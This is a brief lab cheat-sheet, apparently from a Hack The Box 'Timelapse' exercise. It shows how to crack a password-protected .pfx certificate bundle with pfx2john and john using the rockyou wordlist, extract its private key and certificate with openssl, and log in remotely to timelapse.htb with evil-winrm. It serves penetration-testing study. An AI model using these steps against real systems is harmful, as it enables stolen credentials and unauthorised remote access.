
An .pfx file is an bundle of certificates which are either used for webservers or remote authentication under windows. It stores the private key. If you crack the .pfx file you can utilize openssl to get the private key and authenticate remotely against the target.

1. Convert the .pfx file into hash

```
pfx2john <pfx_file>
```

2. Crack the hash

```
john <hash> --wordlist=/usr/share/wordlist/rockyou.txt
```

3. Use OpenSSL to extract private key

```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
```

4. Extract Certificate using OpenSSL

```
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out key.cert
```

5. Connect to the target system using evil-winrm.

```
evil-winrm -i timelapse.htb -c key.cert -k key.pem -S
```